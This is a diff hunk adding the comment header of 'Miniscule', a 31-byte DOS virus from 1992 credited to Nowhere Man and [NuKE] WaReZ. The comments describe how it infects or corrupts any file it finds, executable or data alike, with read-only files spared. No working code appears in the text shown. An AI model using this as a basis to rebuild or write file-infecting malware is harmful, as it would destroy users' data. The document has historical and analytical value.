@@ -1,0 +1,9 @@
+; Miniscule:  the world's smallest generic virus (only 31 bytes long!)
+; (C) 1992 Nowhere Man and [NuKE] WaReZ
+; Written on January 22, 1991
+
+; Find the name of the first file and return it in the DTA.  No checking
+; is done for previous infections, and ANY file (except directory "files")
+; will be infected, including data, texts, etc.  So either a file is corrupted
+; (in the case of data or text) or infected (.EXE and .COM files).  Files that
+; have the read-only flag set are immune to Miniscule.
